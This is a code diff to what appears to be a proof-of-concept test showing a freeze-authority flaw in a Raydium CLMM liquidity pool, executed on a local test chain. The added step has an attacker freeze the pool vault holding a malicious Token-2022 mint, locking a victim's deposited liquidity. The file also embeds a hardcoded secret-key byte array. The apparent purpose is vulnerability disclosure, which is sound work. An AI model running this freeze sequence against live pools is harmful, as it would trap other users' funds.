@@ -19,7 +19,7 @@ import idl from "../target/idl/raydium_clmm.json";
 const ADMIN_SECRET = [222,63,238,12,143,134,142,4,161,175,48,183,228,55,162,51,74,95,237,146,26,147,77,52,54,75,28,199,42,240,0,96,35,202,64,63,172,172,171,217,58,31,133,50,107,206,250,166,98,247,161,237,96,59,107,111,178,144,88,198,240,205,45,4];
 
 describe("freeze authority poc", () => {
-  it("Step 1-5: creates mint, amm_config, pool, and deposits liquidity", async () => {
+  it("Step 1-6: creates mint, amm_config, pool, deposits liquidity, freezes vault", async () => {
     const context = await startAnchor(".", [], []);
     const client = context.banksClient;
     const payer = context.payer;
@@ -186,7 +186,7 @@ describe("freeze authority poc", () => {
     await client.processTransaction(fundVictimTx);
     console.log("STEP 5a PASS: victim funded");
 
-    const { createAssociatedTokenAccountInstruction, createMintToInstruction, getAssociatedTokenAddressSync } = await import("@solana/spl-token");
+    const { createAssociatedTokenAccountInstruction, createMintToInstruction, getAssociatedTokenAddressSync, createFreezeAccountInstruction } = await import("@solana/spl-token");
 
     const victimAta0 = getAssociatedTokenAddressSync(tokenMint0, victim.publicKey, false, TOKEN_2022_PROGRAM_ID);
     const victimAta1 = getAssociatedTokenAddressSync(tokenMint1, victim.publicKey, false, TOKEN_2022_PROGRAM_ID);
@@ -275,7 +275,39 @@ describe("freeze authority poc", () => {
     openPositionTx.feePayer = victim.publicKey;
     openPositionTx.sign(victim, positionNftMint);
     await client.processTransaction(openPositionTx);
-
     console.log("STEP 5c PASS: victim opened a real position and deposited real liquidity into the vaults");
+
+    // === STEP 6: attacker freezes the vault holding the malicious mint ===
+    const fundAttackerTx = new Transaction().add(
+      SystemProgram.transfer({
+        fromPubkey: payer.publicKey,
+        toPubkey: attacker.publicKey,
+        lamports: 1_000_000_000,
+      })
+    );
+    const [bhAttacker] = await client.getLatestBlockhash();
+    fundAttackerTx.recentBlockhash = bhAttacker;
+    fundAttackerTx.feePayer = payer.publicKey;
+    fundAttackerTx.sign(payer);
+    await client.processTransaction(fundAttackerTx);
+
+    const freezeTargetVault = tokenMint0.equals(mint.publicKey) ? tokenVault0 : tokenVault1;
+
+    const freezeIx = createFreezeAccountInstruction(
+      freezeTargetVault,
+      mint.publicKey,
+      attacker.publicKey,
+      [],
+      TOKEN_2022_PROGRAM_ID
+    );
+
+    const freezeTx = new Transaction().add(freezeIx);
+    const [bh9] = await client.getLatestBlockhash();
+    freezeTx.recentBlockhash = bh9;
+    freezeTx.feePayer = attacker.publicKey;
+    freezeTx.sign(attacker);
+    await client.processTransaction(freezeTx);
+
+    console.log("STEP 6 PASS: attacker froze the pool vault:", freezeTargetVault.toBase58());
   });
 });
